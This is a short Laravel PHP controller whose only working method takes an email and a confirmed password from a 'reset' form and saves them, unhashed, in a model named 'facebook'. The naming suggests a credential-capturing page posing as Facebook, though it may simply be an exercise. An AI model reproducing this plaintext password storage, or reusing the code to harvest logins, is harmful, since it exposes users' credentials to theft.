<?php

namespace App\Http\Controllers;

use App\Models\facebook;
use Illuminate\Http\Request;
use Symfony\Contracts\Service\Attribute\Required;

class resetcontroller extends Controller
{
    /**
     * Display a listing of the resource.
     */
    public function index()
    {
        //
    }

    /**
     * Show the form for creating a new resource.
     */
    public function create()
    {
        //
    }

    /**
     * Store a newly created resource in storage.
     */
    public function store(Request $request)
    {
        $request->validate([
            'email' => 'required|email|unique:users', 
            'mdp' => 'required|confirmed'
        ], [
            'mdp.confirmed' => "Les mots de passe ne correspondent pas."
        ]);
    
            $re=new facebook();
            $re->email=$request->input('email');
            $re->password=$request->input('mdp');
            $re->save();
            return view('validerview')->with('t',$request);
        }

    /**
     * Display the specified resource.
     */
    public function show(string $id)
    {
        //
    }

    /**
     * Show the form for editing the specified resource.
     */
    public function edit(string $id)
    {
        //
    }

    /**
     * Update the specified resource in storage.
     */
    public function update(Request $request, string $id)
    {
        //
    }

    /**
     * Remove the specified resource from storage.
     */
    public function destroy(string $id)
    {
        //
    }
}
